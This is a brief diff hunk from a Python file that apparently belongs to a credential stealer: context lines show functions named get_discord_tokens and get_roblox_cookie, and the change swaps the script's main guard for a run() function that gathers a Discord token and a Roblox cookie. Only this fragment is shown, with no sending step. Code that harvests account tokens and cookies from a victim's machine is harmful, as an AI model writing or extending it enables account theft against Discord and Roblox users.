@@ -87,7 +87,7 @@ def get_roblox_cookie():
             except:
                 pass
 
-if __name__ == "__main__":
+def run():
     discord_token = get_discord_tokens()
     roblox_token = get_roblox_cookie()
     
